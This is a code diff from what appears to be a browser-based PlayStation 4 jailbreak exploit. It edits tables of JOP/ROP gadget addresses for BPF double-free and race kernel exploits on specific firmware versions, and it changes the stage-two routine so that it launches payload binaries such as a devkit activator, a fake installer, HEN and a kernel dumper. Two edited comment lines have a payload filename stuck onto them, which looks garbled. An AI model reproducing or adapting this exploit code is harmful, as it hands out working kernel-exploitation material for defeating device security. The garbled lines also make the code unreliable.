@@ -114,7 +114,7 @@ if (fwFromUA == "3.55") {
 		// JOP gadgets for BPF double free kexploit
 		"jop1":                   0x0061A86D, // 3.55 SPECIAL
 		"jop2":                   0x00886461, // 3.55
-		"jop3":                   0x01120BAB, // 3.55
+		"jop3":                   0x01120BAB, // 3.55PS4-devkit-activator-noActCode-5.05.bin
 		"jop4":                   0x0086D4F0, // 3.55 SPECIAL
 		"jop_mov rbp, rsp":       0x00D472C1, // 3.55 SPECIAL
 		"jop6":                   0x005CB98D, // 3.55 SPECIAL
@@ -229,7 +229,7 @@ if (fwFromUA == "3.55") {
 		// BPF race kexploit
 		"leave":                  0x0003EBD0, // 4.55-4.74
 		
-		// BPF double free kexploit
+		// BPF double free kexploitPS4-devkit-activator-noActCode-5.05.bin
 		"ret2userland":           0x0008905C, // 4.55-4.74
 		"add rsp, 0x28":          0x000028A2, // 4.55-4.74
 		"mov rax, [rdi]":         0x0013A220, // 4.55-4.74
@@ -1254,14 +1254,6 @@ function stage2_ () {
 	//sleep(500);
 	var runPayload = window.runPayload;
 	
-    if (isDoExploit)
-    {
-       while (1)
-       {
-            alert("Please close and restart the browser before proceed");
-       }
-    }
-
 	// Check mira status
 	var testMira = p.syscall("sys_setlogin", p.stringify("root"));
 	if (testMira == '0')
@@ -1286,28 +1278,33 @@ function stage2_ () {
 		}
 		*/
 		
-        runPayload("PS4-devkit-activator-5.05-activate.bin");
+        alert("Please use it together with HEN.");
+
+        if (isDoExploit)
+             location.reload();
+        else
+            runPayload("PS4-devkit-activator-noActCode-5.05.bin");
 
 		allset();
 	} else if (fwFromUA == "4.74") {
 		//runPayload("kdumper.bin");
-		//runPayload("fake_installer.bin");
+		runPayload("fake_installer.bin");
 		//runPayload("unblocker.bin");
 		
 		allset();
 	} else if (fwFromUA == "4.555") {
 		//runPayload("kdumper.bin");
-		//runPayload("ps4-hen-vtx-455.bin");
-		//runPayload("unblocker.bin");
+		runPayload("ps4-hen-vtx-455.bin");
+		runPayload("unblocker.bin");
 		
 		allset();
 	} else if (window.ps4_fw <= 107) {
-		//alert("Manual payload");
-		//runPayload("kdumper.bin");
+		alert("Manual payload");
+		runPayload("kdumper.bin");
 		//runPayload("ps4-hen-vtx-455.bin");
 		//runPayload("unblocker.bin");
 		
-		allset();
+		//allset();
 	} else {
 		// Load payload launcher
 		var code_addr = new int64(0x26100000, 0x00000009);
